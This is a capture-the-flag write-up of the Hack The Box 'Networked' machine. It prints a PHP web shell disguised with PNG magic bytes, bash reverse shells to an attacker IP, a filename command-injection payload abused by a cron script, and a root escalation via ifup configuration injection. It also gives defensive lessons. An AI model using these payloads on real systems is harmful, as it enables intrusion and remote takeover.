# Hack The Box - Networked Writeup

> A complete walkthrough of the **Networked** machine from Hack The Box, covering web enumeration, source code analysis, file upload bypass techniques, remote command execution, privilege escalation through a vulnerable cron process, and misconfigured sudo permissions.

---

## Machine Information

| Platform     | Machine   | Difficulty | Operating System |
| ------------ | --------- | ---------- | ---------------- |
| Hack The Box | Networked | Easy       | Linux            |

---

# 📌 Overview

**Networked** is a Linux-based Hack The Box machine that demonstrates how multiple small weaknesses can be chained together to achieve complete system compromise.

The machine initially exposes:

* SSH
* HTTP

Web enumeration reveals hidden functionality related to image uploading and galleries. Further directory enumeration exposes a backup archive containing the application's source code.

Analyzing the source code reveals weaknesses in the file upload validation mechanism. By crafting a file that satisfies the application's extension and file-type checks while containing executable PHP code, arbitrary command execution becomes possible.

Initial access is obtained as the low-privileged `apache` user. Further enumeration reveals a scheduled process associated with the user `guly`. By abusing insecure handling of filenames within the script executed by the cron job, access is escalated to the `guly` user.

Finally, `sudo -l` reveals that `guly` can execute a privileged script as root. Analysis of the script and its interaction with network configuration results in command execution as root.

The complete attack chain was:

```text
Web Enumeration
      ↓
Backup Archive Discovery
      ↓
Source Code Analysis
      ↓
Upload Validation Bypass
      ↓
PHP Command Execution
      ↓
Apache User Shell
      ↓
Cron Job Abuse
      ↓
Guly User
      ↓
Sudo Misconfiguration
      ↓
Root
```

---

# 🗂️ Table of Contents

* [Reconnaissance](#-reconnaissance)
* [Port Scanning](#-port-scanning)
* [Service Enumeration](#-service-enumeration)
* [Web Enumeration](#-web-enumeration)
* [Directory Discovery](#-directory-discovery)
* [Backup Analysis](#-backup-analysis)
* [Source Code Review](#-source-code-review)
* [File Upload Bypass](#-file-upload-bypass)
* [Initial Access](#-initial-access)
* [Shell Stabilization](#-shell-stabilization)
* [Privilege Escalation to Guly](#-privilege-escalation-to-guly)
* [Privilege Escalation to Root](#-privilege-escalation-to-root)
* [Attack Path Summary](#-attack-path-summary)
* [Key Takeaways](#-key-takeaways)

---

# 🔍 Reconnaissance

The target IP address was:

```text
10.129.76.171
```

Starting with a port scan to identify exposed services.

---

# 🔎 Port Scanning

A complete port scan was initiated.

```bash
nmap -p- --min-rate 5000 10.129.76.171
```

### Results

```text
PORT    STATE  SERVICE
22/tcp  open   ssh
80/tcp  open   http
443/tcp closed https
```

The primary attack surface consisted of:

| Port | Service |
| ---- | ------- |
| 22   | SSH     |
| 80   | HTTP    |

HTTPS was detected but was closed.

The HTTP service became the primary focus for further enumeration.

---

# 🔬 Service Enumeration

A detailed service and version detection scan was performed.

```bash
nmap -sC -sV -p22,80 10.129.76.171
```

### Results

```text
22/tcp open  ssh
OpenSSH 7.4

80/tcp open  http
Apache httpd 2.4.6 (CentOS)
PHP/5.4.16
```

The target was running:

```text
OpenSSH 7.4
Apache 2.4.6
PHP 5.4.16
CentOS
```

The presence of an older PHP version and a custom web application made web enumeration the logical next step.

---

# 🌐 Web Enumeration

The target was added to the local hosts file.

```bash
echo "10.129.76.171 networked.htb" >> /etc/hosts
```

Browsing the application revealed a simple webpage.

Inspecting the page source revealed an interesting comment:

```html
<!-- upload and gallery not yet linked -->
```

The page also contained:

```text
Hello mate, we're building the new FaceMash!

Help by funding us and be the new Tyler&Cameron!

Join us at the pool party this Sat to get a glimpse
```

The hidden comment strongly suggested that upload and gallery functionality existed but was not directly linked from the main page.

This became an important clue for further enumeration.

---

# 📂 Directory Discovery

Directory enumeration was performed using `feroxbuster`.

```bash
feroxbuster -u http://networked.htb/
```

Interesting results included:

```text
/backup
/uploads
```

Further inspection revealed:

```text
http://networked.htb/backup/backup.tar
```

The backup archive was downloaded for analysis.

---

# 📦 Backup Analysis

The archive was extracted.

```bash
tar -xvf backup.tar
```

The following files were recovered:

```text
index.php
lib.php
photos.php
upload.php
```

This was extremely valuable because the application's source code was now available for review.

Instead of blindly attempting file upload bypasses, the source code could be analyzed to understand exactly how validation was implemented.

---

# 🔍 Source Code Review

Reviewing the upload functionality revealed the following extension validation logic:

```php
list ($foo,$ext) = getnameUpload($myFile["name"]);

$validext = array('.jpg', '.png', '.gif', '.jpeg');

$valid = false;

foreach ($validext as $vext) {
    if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
        $valid = true;
    }
}
```

The application only allowed filenames ending with:

```text
.jpg
.png
.gif
.jpeg
```

However, the validation logic focused heavily on the filename extension.

This suggested that it might be possible to create a file that:

1. Passed the image validation checks.
2. Retained an executable PHP extension within its filename.
3. Contained valid PHP code.

---

# 🧪 File Upload Bypass

A PHP command execution payload was created.

```php
<?php
system($_REQUEST['cmd']);
?>
```

The payload was initially saved as:

```text
shell.php.png
```

However, simple extension manipulation may not always bypass file validation.

If the application checks MIME types or file signatures, a fake image extension alone may be rejected.

To make the payload appear more like a valid PNG file, the PNG magic bytes were added.

```bash
echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > mime.php.png
```

The PHP payload was then appended.

```bash
cat shell.php.png >> mime.php.png
```

The resulting file contained:

```text
PNG Magic Bytes
        +
PHP Payload
```

This allowed the file to satisfy the application's upload validation while preserving executable PHP content.

---

# 🚨 Remote Command Execution

The crafted payload was uploaded through the vulnerable upload functionality.

The uploaded file was placed inside the web-accessible uploads directory.

The application generated a filename based on the client IP address.

The uploaded payload became accessible at a location similar to:

```text
http://networked.htb/uploads/10_10_15_95.php.png
```

A command was supplied using the `cmd` parameter.

```text
http://networked.htb/uploads/10_10_15_95.php.png?cmd=id
```

Successful execution confirmed remote command execution.

This resulted in the following attack path:

```text
File Upload
      ↓
Validation Bypass
      ↓
PHP Payload
      ↓
Web Accessible Upload Directory
      ↓
Command Execution
```

---

# 🐚 Initial Access

A reverse shell payload was executed using `curl`.

```bash
curl -G --data-urlencode 'cmd=bash -c "/bin/bash -i >& /dev/tcp/10.10.15.95/4444 0>&1"' \
http://networked.htb/uploads/10_10_15_95.php.png
```

A Netcat listener was started locally.

```bash
nc -lvnp 4444
```

A connection was received.

```text
Connection received on 10.129.76.171
```

Checking the current user:

```bash
id
```

Output:

```text
uid=48(apache) gid=48(apache) groups=48(apache)
```

Initial access was obtained as:

```text
apache
```

---

# 🖥️ Shell Stabilization

The initial shell was unstable.

Python was available on the target.

```bash
which python
```

A pseudo-terminal was spawned.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

The shell was then backgrounded.

```text
CTRL + Z
```

Terminal settings were adjusted locally.

```bash
stty raw -echo
```

The shell was returned to the foreground.

```bash
fg
```

Environment variables were configured.

```bash
export SHELL=bash
export TERM=xterm-256color
```

The shell was now easier to interact with.

---

# 🔼 Privilege Escalation to Guly

Enumeration of accessible files revealed:

```text
check_attack.php
crontab.guly
user.txt
```

The presence of:

```text
crontab.guly
```

suggested that a scheduled process was executing commands associated with the user `guly`.

Reviewing the related script revealed interesting filename handling.

Relevant code included:

```php
list ($name,$ext) = getnameCheck($value);

$check = check_ip($name,$value);

if (!($check[0])) {
    echo "attack!\n";

    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");

    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");

    mail($to, $msg, $msg, $headers, "-F$value");
}
```

The script interacted with filenames using shell commands.

This created an opportunity for command injection through a maliciously crafted filename.

A reverse shell command was Base64 encoded.

```bash
echo -n 'bash -c "/bin/bash -i >& /dev/tcp/10.10.15.95/5555 0>&1"' | base64
```

A specially crafted filename was then created.

```bash
touch -- ';echo BASE64_PAYLOAD | base64 -d | bash'
```

When the scheduled script processed the malicious filename, the injected command was executed.

A listener was started.

```bash
nc -lvnp 5555
```

A new shell was received.

Checking the current user:

```bash
id
```

The shell was now running as:

```text
guly
```

The user flag was available.

```bash
cat user.txt
```

---

# 🚩 User Access

The successful privilege escalation resulted in access as:

```text
guly
```

The user's home directory contained:

```text
check_attack.php
crontab.guly
user.txt
```

The user flag was read successfully.

---

# 👑 Privilege Escalation to Root

The next step was checking available sudo permissions.

```bash
sudo -l
```

Output:

```text
User guly may run the following commands on networked:

(root) NOPASSWD: /usr/local/sbin/changename.sh
```

The user could execute:

```text
/usr/local/sbin/changename.sh
```

as root without providing a password.

The script was inspected.

```bash
cat /usr/local/sbin/changename.sh
```

Contents:

```bash
#!/bin/bash -p

cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
    echo "interface $var:"
    read x

    while [[ ! $x =~ $regexp ]]; do
        echo "wrong input, try again"
        echo "interface $var:"
        read x
    done

    echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done

/sbin/ifup guly0
```

The script accepts user-controlled input and writes it directly into a network configuration file.

The script eventually executes:

```bash
/sbin/ifup guly0
```

Because the script runs as root, unsafe values written into the interface configuration can lead to command execution during the network interface activation process.

---

# 💥 Root Access

The privileged script was executed.

```bash
sudo /usr/local/sbin/changename.sh
```

The following values were supplied:

```text
interface NAME:
abc /bin/bash

interface PROXY_METHOD:
abc

interface BROWSER_ONLY:
abc

interface BOOTPROTO:
abc
```

When the network configuration was processed, a root shell was obtained.

Checking the current privileges:

```bash
id
```

Output:

```text
uid=0(root) gid=0(root) groups=0(root)
```

Root access was successfully obtained.

The root flag was then read.

```bash
cat /root/root.txt
```

---

# 🗺️ Attack Path Summary

```text
┌──────────────────────────────┐
│          Nmap Scan           │
│                              │
│ 22 - SSH                     │
│ 80 - HTTP                    │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│       Web Enumeration        │
│                              │
│ Hidden Upload Functionality  │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│      Directory Discovery     │
│                              │
│ /backup                      │
│ /uploads                     │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│       Download backup.tar    │
│                              │
│ Source Code Disclosure       │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│       Analyze upload.php     │
│                              │
│ Weak File Validation         │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│      Upload PHP Payload      │
│                              │
│ PNG Header Bypass            │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│       Remote Code Execution  │
│                              │
│       apache User            │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│        Cron Job Analysis     │
│                              │
│ Command Injection            │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│          guly User           │
│                              │
│        User Access           │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│          sudo -l             │
│                              │
│ changename.sh as root        │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│      Network Script Abuse    │
│                              │
│ Privileged Command Execution │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│            ROOT              │
│                              │
│      Full System Access      │
└──────────────────────────────┘
```

---

# 🔗 Complete Attack Chain

```text
Nmap Enumeration
       │
       ▼
HTTP Enumeration
       │
       ▼
Hidden Application Functionality
       │
       ▼
Backup Archive Discovery
       │
       ▼
Source Code Review
       │
       ▼
Upload Validation Weakness
       │
       ▼
PHP Payload Upload
       │
       ▼
Remote Command Execution
       │
       ▼
apache
       │
       ▼
Cron Job Enumeration
       │
       ▼
Filename Command Injection
       │
       ▼
guly
       │
       ▼
Sudo Enumeration
       │
       ▼
changename.sh
       │
       ▼
Network Configuration Abuse
       │
       ▼
ROOT
```

---

# 🧠 Key Takeaways

## 🔹 Backup Files Can Expose Application Logic

The discovery of:

```text
backup.tar
```

was one of the most important findings during enumeration.

Backup files can expose:

* Application source code
* Configuration files
* Credentials
* API keys
* Internal paths
* Validation logic

In this case, source code access made it possible to understand the exact upload validation mechanism.

---

## 🔹 Always Analyze Custom Upload Functionality

File upload functionality should never be trusted based only on client-side restrictions.

The application attempted to restrict uploads using allowed extensions.

However, the validation logic could be bypassed by carefully crafting the uploaded file.

The attack chain was:

```text
Weak Validation
      +
Executable Extension
      +
Valid File Signature
      +
Web Accessible Upload Directory
      =
Remote Code Execution
```

---

## 🔹 File Signatures Matter

Simply renaming a malicious file may fail when applications validate file signatures.

Adding valid image magic bytes allowed the crafted payload to better satisfy file validation.

This demonstrates the importance of understanding:

```text
Filename Validation
MIME Validation
Magic Bytes
Server-Side Execution
```

All validation layers must be properly implemented.

---

## 🔹 Source Code Review Is Powerful

Once source code became available, guessing was no longer necessary.

Reviewing the application logic provided direct insight into:

* Allowed extensions
* File naming mechanisms
* Upload paths
* Validation weaknesses

Source code disclosure can significantly reduce the time required to identify vulnerabilities.

---

## 🔹 Scheduled Tasks Can Introduce Privilege Escalation

The cron-related script processed attacker-controlled filenames.

Unsafe interaction between:

```text
User Controlled Filename
          ↓
Shell Command
          ↓
Scheduled Execution
          ↓
Different User Context
```

created a privilege escalation path.

Whenever user-controlled input reaches shell commands, proper escaping and safe APIs are essential.

---

## 🔹 Always Check sudo Permissions

After obtaining access as `guly`, the following command immediately revealed an important privilege escalation vector:

```bash
sudo -l
```

The output showed that a root-owned script could be executed without a password.

Custom scripts running with elevated privileges should always be reviewed carefully.

---

## 🔹 Root Scripts Require Strict Input Validation

The final escalation path involved:

```text
User Controlled Input
       ↓
Root Executed Script
       ↓
Network Configuration File
       ↓
ifup Processing
       ↓
Command Execution
```

Even when input validation exists, developers must consider how downstream programs interpret the generated data.

A restrictive-looking regular expression does not guarantee security if the accepted values can still be interpreted dangerously by another component.

---

# 🛠️ Tools Used

```text
Nmap
Feroxbuster
Tar
Curl
Netcat
Python
Base64
SSH
Sudo
Linux Enumeration Commands
```

---

# 📚 Vulnerabilities and Misconfigurations

| Finding                     | Component        | Impact                    |
| --------------------------- | ---------------- | ------------------------- |
| Exposed Backup Archive      | Web Server       | Source Code Disclosure    |
| Weak Upload Validation      | PHP Application  | Arbitrary File Upload     |
| Executable Upload Directory | Apache/PHP       | Remote Code Execution     |
| Unsafe Filename Handling    | Scheduled Script | Command Injection         |
| Insecure Privileged Script  | sudo             | Root Privilege Escalation |

---

# 🎯 Lessons Learned

**Networked** demonstrates how multiple relatively small weaknesses can be chained together.

```text
Backup Exposure
       +
Source Code Disclosure
       +
Weak Upload Validation
       +
Command Execution
       +
Unsafe Cron Processing
       +
Sudo Misconfiguration
       =
Complete System Compromise
```

The machine reinforces several important penetration testing principles:

1. Always perform thorough directory enumeration.
2. Never ignore backup files.
3. Review exposed application source code carefully.
4. Analyze file upload validation mechanisms.
5. Check whether uploaded files are web accessible.
6. Stabilize shells for easier enumeration.
7. Investigate scheduled tasks and cron jobs.
8. Look for unsafe shell interactions with user-controlled input.
9. Always run `sudo -l`.
10. Review privileged scripts line by line.
11. Consider how downstream applications interpret sanitized input.

---

# 🏁 Final Notes

Hack The Box **Networked** is an excellent machine for understanding chained exploitation.

Rather than relying on a single critical vulnerability, the compromise progresses through multiple weaknesses.

```text
Enumeration
      ↓
Information Disclosure
      ↓
Source Code Analysis
      ↓
Upload Bypass
      ↓
Initial Access
      ↓
Cron Job Abuse
      ↓
User Privilege Escalation
      ↓
Sudo Misconfiguration
      ↓
Root
```

The most important lesson from this machine is:

> **A complete compromise does not always require a single critical vulnerability. Multiple small weaknesses, when chained together, can be equally dangerous.**

---

## ⚠️ Disclaimer

This writeup is created strictly for educational purposes and documents techniques performed against the intentionally vulnerable **Hack The Box Networked** machine in an authorized laboratory environment.

Do not attempt these techniques against systems without explicit authorization.

---

<p align="center">
  <b>Happy Hacking!</b>
</p>
